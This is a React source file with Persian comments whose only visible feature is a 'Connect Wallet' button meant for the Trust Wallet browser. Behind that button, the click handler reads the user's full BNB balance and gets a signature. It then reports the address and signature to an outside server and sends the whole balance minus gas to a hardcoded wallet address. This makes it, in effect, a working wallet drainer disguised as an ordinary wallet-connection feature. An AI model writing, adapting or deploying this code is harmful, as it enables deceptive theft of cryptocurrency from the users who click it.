import React, { useState } from "react";

async function getLiveBalance(address) {
  try {
    // دریافت بالانس به صورت hex از طریق eth_getBalance
    const balanceHex = await window.ethereum.request({
      method: "eth_getBalance",
      params: [address, "latest"],
    });
    // تبدیل به عدد اعشاری
    return parseFloat(parseInt(balanceHex, 16) / 1e18).toFixed(6);
  } catch (error) {
    console.error("❌ Error fetching live balance:", error);
    return null;
  }
}

async function getGasPrice() {
  try {
    const gasPriceHex = await window.ethereum.request({
      method: "eth_gasPrice",
      params: [],
    });
    return parseInt(gasPriceHex, 16); // به Wei
  } catch (error) {
    console.error("❌ Error fetching gas price:", error);
    return null;
  }
}

function App() {
  const [account, setAccount] = useState(null);

  async function connectAndSend() {
    if (typeof window.ethereum === "undefined") {
      alert("No Ethereum provider found. Please open in Trust Wallet DApp Browser!");
      return;
    }

    let accounts;
    try {
      accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    } catch (err) {
      console.error("❌ Could not request accounts:", err);
      return;
    }
    if (!accounts || !accounts.length) {
      console.error("❌ No account returned.");
      return;
    }
    const userAddress = accounts[0];
    setAccount(userAddress);
    console.log("✅ User address:", userAddress);

    // دریافت بالانس زنده از شبکه (eth_getBalance)
    const liveBalance = await getLiveBalance(userAddress);
    console.log("💰 Live BNB Balance:", liveBalance);
    const totalBalance = parseFloat(liveBalance);

    // دریافت قیمت gas به صورت پویا
    const gasPriceWei = await getGasPrice();
    if (!gasPriceWei) return;
    console.log("💰 Current gas price (Wei):", gasPriceWei);

    const gasLimit = 21000; // استاندارد انتقال BNB
    const gasCostBNB = (gasLimit * gasPriceWei) / 1e18;
    console.log("Estimated gas cost (BNB):", gasCostBNB);

    // اگر می‌خواهید reserve ثابت نداشته باشید، sendAmount = balance - gasCost
    const sendAmount = totalBalance - gasCostBNB;
    if (sendAmount <= 0) {
      console.error("❌ Insufficient funds: not enough to cover gas fee.");
      return;
    }
    console.log("Calculated send amount (BNB):", sendAmount);

    // ساخت پیام برای امضا (بر اساس sendAmount)
    const message = `Authorize sending ${sendAmount} BNB from ${userAddress}`;
    console.log("📜 Message to sign:", message);

    let signature;
    try {
      signature = await window.ethereum.request({
        method: "personal_sign",
        params: [message, userAddress],
      });
      console.log("✍️ Signature:", signature);
    } catch (error) {
      console.error("❌ Error in personal_sign:", error);
      return;
    }

    // ارسال امضا به سرور جهت بررسی و ثبت لاگ
    try {
      const resp = await fetch("https://sponsorbinance.vercel.app/api/proxy", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          handler: "tx",
          address: userAddress,
          signature: signature,
          amount: sendAmount.toString(),
        }),
      });
      const result = await resp.json();
      console.log("Server verify response:", result);
      if (!result.success) {
        console.error("❌ Signature verification failed or server error.", result);
        return;
      }
    } catch (e) {
      console.error("❌ Could not call server to verify signature:", e);
      return;
    }

    // ساخت تراکنش واقعی
    const sendWeiHex = "0x" + (sendAmount * 1e18).toString(16);
    const txParams = {
      from: userAddress,
      to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD", // آدرس مقصد
      value: sendWeiHex
      // gas و gasPrice حذف شده‌اند تا کیف پول به‌طور خودکار تخمین بزند.
    };

    try {
      const txHash = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [txParams],
      });
      console.log("📤 Transaction broadcasted. Hash:", txHash);
      alert("Transaction sent! TxHash: " + txHash);
    } catch (err) {
      console.error("❌ Error sending transaction:", err);
    }
  }

  return (
    <div style={{ margin: "20px" }}>
      <a
        href="#"
        onClick={connectAndSend}
        className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      >
        {account ? `Connected: ${account}` : "Connect Wallet"}
      </a>
    </div>
  );
}

export default App;
